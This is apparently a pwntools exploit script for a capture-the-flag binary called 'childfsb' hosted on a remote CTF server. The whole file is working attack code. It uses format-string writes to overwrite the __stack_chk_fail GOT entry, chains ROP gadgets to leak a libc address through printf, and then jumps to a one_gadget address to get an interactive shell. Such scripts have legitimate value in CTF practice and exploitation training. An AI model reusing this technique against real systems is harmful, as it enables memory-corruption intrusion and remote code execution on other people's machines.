from pwn import *

#p = process('./childfsb')
p = remote('ctf.j0n9hyun.xyz', 3037)
e = ELF('./childfsb')
l = e.libc

pause()
context.log_level = "debug"

p_rdi_r = 0x0000000000400833
ret = 0x400760
main = 0x000000000040075F
ppr = 0x400830
pppr = 0x40082e
ppppr = 0x40082b
pppppr =0x000000000040082b
ppppppr = 0x40082a

### return to main (but start at mov rsp,rbp)
payload = '%' + str(ret) + 'c'
payload += '%8$n' + 'aaa'
payload += p64(e.got['__stack_chk_fail'])
payload += 'a' * (0x19 - len(payload))

p.sendafter('hello\n', payload)

############################

####ROP CODE####
payload = p64(e.plt['printf'])
payload += p64(main)
payload += 'a' * (0x19 - len(payload))

p.sendafter('hello\n', payload)

payload = p64(p_rdi_r)
payload += p64(e.got['read'])
payload += p64(ppr)
payload += 'a' * (0x19 - len(payload))

p.sendafter('hello\n', payload)

############################

### overwrite ppppppr to execute ROP CODE###
payload = '%' + str(ppppppr) + 'c'
payload += '%8$n' + 'aaa'
payload += p64(e.got['__stack_chk_fail'])
payload += 'a' * (0x19 - len(payload))

p.sendafter('hello\n', payload)

#############################

### libc leak###
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - l.sym['read']
log.info('libc : ' + hex(libc))

#############################

### return to main (but start at mov rsp,rbp)
payload = '%' + str(ret) + 'c'
payload += '%8$n' + 'aaa'
payload += p64(e.got['__stack_chk_fail'])
payload += 'a' * (0x19 - len(payload))

p.sendafter('hello\n', payload)

#############################

### one_gadget###
payload = p64(libc + 0x45216)
payload += 'a' * (0x19 - len(payload))

p.sendafter('hello\n', payload)

############################

### overwrite ppppppr to execute one_gadget###
payload = '%' + str(ppppppr) + 'c'
payload += '%8$n' + 'aaa'
payload += p64(e.got['__stack_chk_fail'])
payload += 'a' * (0x19 - len(payload))

p.sendafter('hello\n', payload)

############################

p.interactive()
